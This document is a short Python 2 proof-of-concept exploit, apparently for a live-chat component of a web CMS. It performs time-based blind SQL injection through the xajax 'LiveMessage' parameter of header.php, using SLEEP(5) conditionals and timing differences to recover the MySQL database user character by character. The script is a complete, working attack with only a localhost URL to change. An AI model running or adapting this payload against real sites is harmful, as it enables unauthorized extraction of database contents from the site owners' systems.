#!/usr/bin/env python
# coding:utf-8
import urllib2
import urllib
import sys
import time
import random


def verify():
    chars = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')
    url = "http://localhost/uploads/celive/live/header.php"
    print 'start to retrive MySQL user:'
    user = ''
    for i in range(15):
        for char in chars:
            payload = "ascii(mid(user(),%s,1))=%s" % (i,ord(char))
            #有延时
            data1 = {
                'xajax': 'LiveMessage',
                'xajaxargs[0][name]': "1',(SELECT IF(%s, sleep(5), '1')),'','','','1','127.0.0.1','2')#" % payload
            }
            #无延时
            data2 = {
                'xajax': 'LiveMessage',
                'xajaxargs[0][name]': "1',(SELECT IF(1=2, sleep(5), '1')),'','','','1','127.0.0.1','2')#"
            }

            start_time = time.time()
            req = urllib2.Request(url, data=urllib.urlencode(data1))
            urllib2.urlopen(req)
            end_time_1 = time.time()

            req2 = urllib2.Request(url, data=urllib.urlencode(data2))
            urllib2.urlopen(req2)
            end_time_2 = time.time()


            temp1 = end_time_1 - start_time
            temp2 = end_time_2 - end_time_1
            print '.',
            if (temp1 -temp2) > 4:
                user += char
                print '\n[please wait] %s' % user,
                break

    print '\n[Done]MySQL user is', user

if __name__ == '__main__':
    verify()
